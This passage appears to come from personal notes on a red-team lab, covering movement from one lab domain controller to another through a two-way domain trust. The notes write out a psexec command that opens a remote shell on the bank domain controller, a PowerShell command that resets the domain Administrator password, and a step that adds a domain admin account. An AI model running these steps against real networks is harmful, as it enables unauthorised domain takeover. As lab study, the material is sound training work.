You've submitted your ticket on ROOTDC, so here you can also authenticate with BANKDC domain, becuase a two-way trust is a relationship established between both domains.

## Come back to CORPDC

C:\Users\Administrator>`exit`

![[Authenticate with BANKDC.BANK.THERESERVE.LOC from host CORPDC-20240612150446037.webp]]

On the CORPDC powershell run:
PS C:\Users\Administrator>`.\psexec.exe \\bankdc.bank.thereserve.loc cmd.exe -accepteula`

![[Authenticate with BANKDC.BANK.THERESERVE.LOC from host CORPDC-20240613135550530.webp]]

### Change the administrator password for ROOTDC

C:\Windows\system32>`powershell.exe -c Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString -AsPlainText "Hacker@123" -Force) -Reset`

Rdp into ROOTDC with the new creds.. created a domain admin user for BankDC. Rdp into BankDC.
